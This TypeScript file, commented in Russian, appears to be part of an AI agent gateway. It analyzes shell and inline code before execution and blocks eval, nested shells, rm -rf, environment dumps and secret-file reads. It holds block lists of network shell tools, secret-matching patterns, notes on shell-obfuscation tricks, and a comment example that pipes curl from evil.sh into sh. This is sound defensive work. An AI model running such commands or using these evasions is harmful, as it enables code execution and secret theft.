/**
 * Структурный анализатор shell-команд и inline-кода для Agent Gateway.
 *
 * Анализатор не проверяет регулярками сериализованные аргументы (`JSON.stringify`):
 * строка сначала токенизируется с учётом кавычек, экранирований и `$IFS`, затем
 * режется на простые команды по `;`, `&&`, `||`, `|`, `&` и переводу строки.
 * Только после этого проверяются бинарники, флаги, перенаправления, обращения к
 * секретам и сетевое намерение.
 *
 * Это defense-in-depth, а не полноценный shell-парсер: при сомнении анализатор
 * блокирует вызов (deny by default).
 */

/** Коды нарушений shell-политики. */
export const SHELL_VIOLATION = {
  FORBIDDEN_BUILTIN: 'SHELL_FORBIDDEN_BUILTIN',
  NESTED_SHELL: 'SHELL_NESTED_SHELL',
  PIPE_TO_SHELL: 'SHELL_PIPE_TO_SHELL',
  COMMAND_SUBSTITUTION: 'SHELL_COMMAND_SUBSTITUTION',
  COMMAND_NOT_ALLOWED: 'SHELL_COMMAND_NOT_ALLOWED',
  RM_RECURSIVE_FORCE: 'SHELL_RM_RECURSIVE_FORCE',
  CHILD_PROCESS: 'SHELL_CHILD_PROCESS',
  SECRET_ACCESS: 'SHELL_SECRET_ACCESS',
  ENV_DUMP: 'SHELL_ENV_DUMP',
  UNTERMINATED_QUOTE: 'SHELL_UNTERMINATED_QUOTE',
} as const;

/** Код нарушения shell-политики. */
export type ShellViolationCode =
  (typeof SHELL_VIOLATION)[keyof typeof SHELL_VIOLATION];

/** Одно нарушение, найденное анализатором. */
export interface ShellViolation {
  code: ShellViolationCode;
  /** Что именно нарушено (имя бинарника/флага), без аргументов вызова. */
  detail?: string;
}

/** Результат анализа shell-кода. */
export interface ShellAnalysis {
  /** Код пытается выйти в сеть. */
  networkRequested: boolean;
  violations: ShellViolation[];
}

/** Опции анализа: allowlist бинарников зависит от инструмента. */
export interface ShellAnalysisOptions {
  allowlist: ReadonlySet<string>;
}

interface WordToken {
  kind: 'word';
  value: string;
}

interface OperatorToken {
  kind: 'operator';
  value: ';' | '&&' | '||' | '|' | '&';
}

type ShellToken = WordToken | OperatorToken;

interface SimpleCommand {
  words: string[];
  /** Команда получает stdin из пайпа предыдущей команды. */
  pipedFrom: boolean;
}

/** Shell builtins, которые позволяют выполнить произвольный код. */
const FORBIDDEN_BUILTINS = new Set(['eval', 'exec', 'source', '.']);

/** Оболочки и их аналоги: вложенный shell всегда запрещён. */
const NESTED_SHELLS = new Set([
  'sh',
  'bash',
  'dash',
  'zsh',
  'ksh',
  'ash',
  'fish',
  'csh',
  'tcsh',
  'busybox',
]);

/** Бинарники, которые по определению означают сетевое намерение. */
const NETWORK_COMMANDS = new Set([
  'curl',
  'wget',
  'nc',
  'netcat',
  'ncat',
  'ssh',
  'scp',
  'sftp',
  'telnet',
  'ftp',
  'rsync',
  'socat',
]);

/** Подкоманды `gh`, которые ходят в GitHub API. */
const GH_NETWORK_SUBCOMMANDS = new Set([
  'api',
  'auth',
  'repo',
  'pr',
  'issue',
  'release',
  'search',
  'gist',
  'workflow',
  'run',
]);

/** Подкоманды `git`, которые ходят в удалённый репозиторий. */
const GIT_NETWORK_SUBCOMMANDS = new Set([
  'clone',
  'fetch',
  'pull',
  'push',
  'ls-remote',
  'submodule',
]);

/** Присваивание переменной перед командой (`FOO=bar cmd`). */
const ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

/** Вызов дочерних процессов из Node.js. */
const NODE_CHILD_RE =
  /\bchild_process\b|\b(?:execSync|spawnSync|execFileSync|execFile)\s*\(|\b(?:spawn|fork)\s*\(|\bDeno\.run\b|\bBun\.spawn\b|\bprocess\.binding\b/;

/** Вызов дочерних процессов из Python и других рантаймов. */
const PYTHON_CHILD_RE =
  /\b(?:subprocess|os\.system|os\.popen|os\.exec[a-z]*|os\.spawn[a-z]*|pty\.spawn)\b/;

/** Сетевые API Python. */
const PYTHON_NETWORK_RE =
  /\b(?:requests|urllib2?|urllib3|httpx|aiohttp|http\.client|socket|ftplib|smtplib|telnetlib)\b/;

/** Сетевые API Node.js. */
const NODE_NETWORK_RE =
  /\bfetch\s*\(|\baxios\b|\bgot\s*\(|\bWebSocket\b|\bEventSource\b|\b(?:https?|net|dns|tls)\.(?:request|get|connect|createConnection|lookup|resolve)\b|\brequire\s*\(\s*['"]?(?:node:)?(?:https?|net|dns|tls)['"]?\s*\)/;

/** Bash-редирект в сетевой сокет: `cat < /dev/tcp/host/port`. */
const DEV_TCP_RE = /\/dev\/(?:tcp|udp)\//;

/** Чтение файла `.env` (в т.ч. `.env.local`) по пути. */
const ENV_FILE_RE =
  /(?:^|[^A-Za-z0-9_-])\.env(?:\.[A-Za-z0-9_-]+)?(?=$|[^A-Za-z0-9_-])/;

/** Чтение окружения процесса через procfs. */
const PROC_ENVIRON_RE = /\/proc\/(?:[^/\s]+\/)?environ\b/;

/** Дамп `process.env` из Node.js. */
const PROCESS_ENV_RE = /\bprocess\.env\b|\bprocess\s*\[\s*['"]?env['"]?\s*\]/;

/** Дамп `os.environ` из Python. */
const PYTHON_ENVIRON_RE = /\bos\.environ\b/;

/** Обращение к переменным окружения с секретами (`$GITHUB_TOKEN` и т.п.). */
const SECRET_ENV_VAR_RE =
  /\$(?:[A-Z][A-Z0-9_]*(?:TOKEN|KEY|SECRET|PASSWORD|PASSWD)[A-Z0-9_]*|\{[A-Z][A-Z0-9_]*(?:TOKEN|KEY|SECRET|PASSWORD|PASSWD)[A-Z0-9_]*\})/;

/**
 * Анализирует shell-код (или inline-код Python/Node) до выполнения.
 *
 * `opts.allowlist` — набор разрешённых бинарников для конкретного инструмента.
 */
export function analyzeShell(
  code: string,
  opts: ShellAnalysisOptions,
): ShellAnalysis {
  const violations: ShellViolation[] = [];
  const seen = new Set<ShellViolationCode>();

  const addViolation = (code_: ShellViolationCode, detail?: string): void => {
    if (seen.has(code_)) {
      return;
    }

    seen.add(code_);
    violations.push(detail === undefined ? { code: code_ } : { code: code_, detail });
  };

  const tokenized = tokenize(code);

  for (const violation of tokenized.violations) {
    addViolation(violation.code, violation.detail);
  }

  if (tokenized.unterminatedQuote) {
    addViolation(SHELL_VIOLATION.UNTERMINATED_QUOTE);
  }

  let networkRequested = false;

  // Bash-редирект `< /dev/tcp/host/port` съедается как перенаправление, поэтому
  // сетевое намерение проверяем по исходному коду.
  if (DEV_TCP_RE.test(code)) {
    networkRequested = true;
  }

  for (const command of splitCommands(tokenized.tokens)) {
    const words = stripAssignments(command.words);

    if (words.length === 0) {
      continue;
    }

    const base = baseName(words[0]);
    const argsText = words.join(' ');

    // Пайп в shell: `curl http://evil.sh | sh`.
    if (command.pipedFrom && NESTED_SHELLS.has(base)) {
      addViolation(SHELL_VIOLATION.PIPE_TO_SHELL, base);
      continue;
    }

    if (FORBIDDEN_BUILTINS.has(base)) {
      addViolation(SHELL_VIOLATION.FORBIDDEN_BUILTIN, base);
      continue;
    }

    if (NESTED_SHELLS.has(base)) {
      addViolation(SHELL_VIOLATION.NESTED_SHELL, base);
      continue;
    }

    if (base === 'rm' && removesRecursivelyWithForce(words)) {
      addViolation(SHELL_VIOLATION.RM_RECURSIVE_FORCE, 'rm');
      continue;
    }

    if (base === 'env' || base === 'printenv') {
      addViolation(SHELL_VIOLATION.ENV_DUMP, base);
      continue;
    }

    if (NETWORK_COMMANDS.has(base)) {
      networkRequested = true;
    }

    const subcommand = words[1];
    if (
      subcommand !== undefined &&
      ((base === 'gh' && GH_NETWORK_SUBCOMMANDS.has(subcommand)) ||
        (base === 'git' && GIT_NETWORK_SUBCOMMANDS.has(subcommand)))
    ) {
      networkRequested = true;
    }

    if (!opts.allowlist.has(base)) {
      addViolation(SHELL_VIOLATION.COMMAND_NOT_ALLOWED, base);
      continue;
    }

    // Inline-код в аргументах (`python3 -c`, `node -e`) проверяем отдельно.
    if (NODE_CHILD_RE.test(argsText) || PYTHON_CHILD_RE.test(argsText)) {
      addViolation(SHELL_VIOLATION.CHILD_PROCESS);
    }

    if (ENV_FILE_RE.test(argsText) || PROC_ENVIRON_RE.test(argsText)) {
      addViolation(SHELL_VIOLATION.SECRET_ACCESS);
    }

    if (
      PROCESS_ENV_RE.test(argsText) ||
      PYTHON_ENVIRON_RE.test(argsText) ||
      SECRET_ENV_VAR_RE.test(argsText)
    ) {
      addViolation(SHELL_VIOLATION.ENV_DUMP);
    }

    if (
      PYTHON_NETWORK_RE.test(argsText) ||
      NODE_NETWORK_RE.test(argsText) ||
      DEV_TCP_RE.test(argsText)
    ) {
      networkRequested = true;
    }
  }

  return { networkRequested, violations };
}

/**
 * Токенизирует код с учётом кавычек и экранирований.
 *
 * Экранирования нормализуются (`r\m` -> `rm`), пустые кавычки удаляются
 * (`r''m` -> `rm`), `$IFS` раскрывается как разделитель. Command substitution
 * и бэктики фиксируются как нарушения.
 */
function tokenize(code: string): {
  tokens: ShellToken[];
  violations: ShellViolation[];
  unterminatedQuote: boolean;
} {
  const tokens: ShellToken[] = [];
  const violations: ShellViolation[] = [];
  let word = '';
  let hasWord = false;
  let wordStart = -1;
  let quote: 'none' | 'single' | 'double' = 'none';
  let i = 0;

  const flushWord = (): void => {
    if (hasWord) {
      tokens.push({ kind: 'word', value: word });
      hasWord = false;
      word = '';
      wordStart = -1;
    }
  };

  const pushOperator = (operator: ';' | '&&' | '||' | '|' | '&'): void => {
    flushWord();
    tokens.push({ kind: 'operator', value: operator });
  };

  const append = (ch: string): void => {
    if (!hasWord) {
      hasWord = true;
      wordStart = i;
    }

    word += ch;
  };

  while (i < code.length) {
    const ch = code[i];

    if (quote === 'single') {
      if (ch === "'") {
        quote = 'none';
      } else {
        append(ch);
      }

      i++;
      continue;
    }

    if (quote === 'double') {
      if (ch === '"') {
        quote = 'none';
        i++;
        continue;
      }

      if (ch === '\\') {
        const next = code[i + 1];

        if (next === undefined) {
          i++;
          continue;
        }

        if (next === '$' || next === '`' || next === '"' || next === '\\') {
          append(next);
          i += 2;
          continue;
        }

        if (next === '\n') {
          i += 2;
          continue;
        }

        append('\\');
        i++;
        continue;
      }

      if (ch === '`') {
        violations.push({ code: SHELL_VIOLATION.COMMAND_SUBSTITUTION });
        i++;
        continue;
      }

      if (ch === '$') {
        const ifsEnd = matchIfs(code, i);

        if (ifsEnd !== null) {
          flushWord();
          i = ifsEnd;
          continue;
        }

        if (code[i + 1] === '(') {
          violations.push({ code: SHELL_VIOLATION.COMMAND_SUBSTITUTION });
          i += 2;
          continue;
        }
      }

      append(ch);
      i++;
      continue;
    }

    // --- Вне кавычек ------------------------------------------------------
    if (ch === '\\') {
      const next = code[i + 1];

      if (next === undefined) {
        i++;
        continue;
      }

      if (next === '\n') {
        i += 2;
        continue;
      }

      append(next);
      i += 2;
      continue;
    }

    if (ch === '$') {
      const ifsEnd = matchIfs(code, i);

      if (ifsEnd !== null) {
        flushWord();
        i = ifsEnd;
        continue;
      }

      if (code[i + 1] === '(') {
        violations.push({ code: SHELL_VIOLATION.COMMAND_SUBSTITUTION });
        i += 2;
        continue;
      }

      if (code[i + 1] === "'") {
        const decoded = decodeAnsiC(code, i + 2);
        for (const decodedChar of decoded.value) {
          append(decodedChar);
        }
        i = decoded.next;
        continue;
      }

      append(ch);
      i++;
      continue;
    }

    if (ch === '`') {
      violations.push({ code: SHELL_VIOLATION.COMMAND_SUBSTITUTION });
      i++;
      continue;
    }

    if (ch === "'") {
      quote = 'single';
      i++;
      continue;
    }

    if (ch === '"') {
      quote = 'double';
      i++;
      continue;
    }

    if (ch === ' ' || ch === '\t') {
      flushWord();
      i++;
      continue;
    }

    if (ch === '\n' || ch === '\r' || ch === ';') {
      pushOperator(';');
      i++;
      continue;
    }

    if (ch === '&') {
      if (code[i + 1] === '&') {
        pushOperator('&&');
        i += 2;
      } else {
        pushOperator('&');
        i++;
      }
      continue;
    }

    if (ch === '|') {
      if (code[i + 1] === '|') {
        pushOperator('||');
        i += 2;
      } else {
        pushOperator('|');
        i++;
      }
      continue;
    }

    if (ch === '>' || ch === '<') {
      // `2>&1`: числовой префикс — это fd, а не слово команды.
      if (
        hasWord &&
        wordStart === i - word.length &&
        /^\d+$/.test(word)
      ) {
        hasWord = false;
        word = '';
        wordStart = -1;
      }

      flushWord();
      i = skipRedirection(code, i);
      continue;
    }

    append(ch);
    i++;
  }

  flushWord();

  return {
    tokens,
    violations,
    unterminatedQuote: quote !== 'none',
  };
}

/** Позиция после `$IFS`/`${IFS}` или null, если это не IFS. */
function matchIfs(code: string, start: number): number | null {
  const rest = code.slice(start);

  if (rest.startsWith('${IFS}')) {
    return start + '${IFS}'.length;
  }

  if (rest.startsWith('$IFS')) {
    const after = code[start + '$IFS'.length];

    // `$IFSX` — другая переменная, а не разделитель.
    if (after === undefined || !/[A-Za-z0-9_]/.test(after)) {
      return start + '$IFS'.length;
    }
  }

  return null;
}

/** Декодирует ANSI-C строку `$'...'`, начиная сразу после открывающей кавычки. */
function decodeAnsiC(
  code: string,
  start: number,
): { value: string; next: number } {
  let value = '';
  let i = start;

  while (i < code.length && code[i] !== "'") {
    if (code[i] !== '\\') {
      value += code[i];
      i++;
      continue;
    }

    const escape = code[i + 1];
    i += 2;

    if (escape === undefined) {
      break;
    }

    switch (escape) {
      case 'n':
        value += '\n';
        break;
      case 't':
        value += '\t';
        break;
      case 'r':
        value += '\r';
        break;
      case '\\':
        value += '\\';
        break;
      case "'":
        value += "'";
        break;
      case '"':
        value += '"';
        break;
      case 'a':
        value += '\u0007';
        break;
      case 'b':
        value += '\b';
        break;
      case 'f':
        value += '\f';
        break;
      case 'v':
        value += '\v';
        break;
      case 'x': {
        const hex = code.slice(i, i + 2);

        if (/^[0-9a-fA-F]{1,2}$/.test(hex)) {
          value += String.fromCharCode(Number.parseInt(hex, 16));
          i += hex.length;
        } else {
          value += 'x';
        }
        break;
      }
      case 'u': {
        const hex = code.slice(i, i + 4);

        if (/^[0-9a-fA-F]{4}$/.test(hex)) {
          value += String.fromCharCode(Number.parseInt(hex, 16));
          i += 4;
        } else {
          value += 'u';
        }
        break;
      }
      default:
        if (/[0-7]/.test(escape)) {
          let octal = escape;

          while (
            octal.length < 3 &&
            i < code.length &&
            /[0-7]/.test(code[i])
          ) {
            octal += code[i];
            i++;
          }

          value += String.fromCharCode(Number.parseInt(octal, 8));
        } else {
          value += escape;
        }
    }
  }

  if (code[i] === "'") {
    i++;
  }

  return { value, next: i };
}

/**
 * Пропускает перенаправление (`> file`, `2>&1`, `<<EOF`) и возвращает позицию
 * после него. Само перенаправление для анализа не нужно: важны команда и её
 * аргументы.
 */
function skipRedirection(code: string, start: number): number {
  let i = start;

  if (code[i] === '<') {
    while (code[i] === '<') {
      i++;
    }

    // `<<-` — heredoc с табуляциями.
    if (code[i] === '-') {
      i++;
    }
  } else {
    i++;
    if (code[i] === '>') {
      i++;
    }
  }

  if (code[i] === '&') {
    i++;
    while (i < code.length && /[0-9-]/.test(code[i])) {
      i++;
    }

    return i;
  }

  while (i < code.length && (code[i] === ' ' || code[i] === '\t')) {
    i++;
  }

  // Имя файла/дескриптора съедаем целиком (с учётом кавычек).
  while (i < code.length && !/[\s;&|<>]/.test(code[i])) {
    if (code[i] === "'") {
      i++;
      while (i < code.length && code[i] !== "'") {
        i++;
      }
      i++;
      continue;
    }

    if (code[i] === '"') {
      i++;
      while (i < code.length && code[i] !== '"') {
        if (code[i] === '\\') {
          i++;
        }
        i++;
      }
      i++;
      continue;
    }

    i++;
  }

  return i;
}

/** Режет поток токенов на простые команды. */
function splitCommands(tokens: readonly ShellToken[]): SimpleCommand[] {
  const commands: SimpleCommand[] = [];
  let words: string[] = [];
  let pipedFrom = false;

  for (const token of tokens) {
    if (token.kind === 'word') {
      words.push(token.value);
      continue;
    }

    if (words.length > 0) {
      commands.push({ words, pipedFrom });
      pipedFrom = token.value === '|';
      words = [];
    } else {
      pipedFrom = pipedFrom || token.value === '|';
    }
  }

  if (words.length > 0) {
    commands.push({ words, pipedFrom });
  }

  return commands;
}

/** Убирает присваивания переменных перед командой. */
function stripAssignments(words: readonly string[]): string[] {
  let start = 0;

  while (start < words.length && ASSIGNMENT_RE.test(words[start])) {
    start++;
  }

  return words.slice(start);
}

/** Имя бинарника без каталога (`/usr/bin/curl` -> `curl`). */
function baseName(word: string): string {
  const slash = Math.max(word.lastIndexOf('/'), word.lastIndexOf('\\'));

  return slash === -1 ? word : word.slice(slash + 1);
}

/** Есть ли у `rm` одновременно recursive- и force-флаг. */
function removesRecursivelyWithForce(words: readonly string[]): boolean {
  let recursive = false;
  let force = false;

  for (const word of words.slice(1)) {
    if (word === '--recursive') {
      recursive = true;
      continue;
    }

    if (word === '--force') {
      force = true;
      continue;
    }

    if (!word.startsWith('-') || word.startsWith('--')) {
      continue;
    }

    const flags = word.slice(1);

    if (flags.includes('r') || flags.includes('R')) {
      recursive = true;
    }

    if (flags.includes('f')) {
      force = true;
    }
  }

  return recursive && force;
}
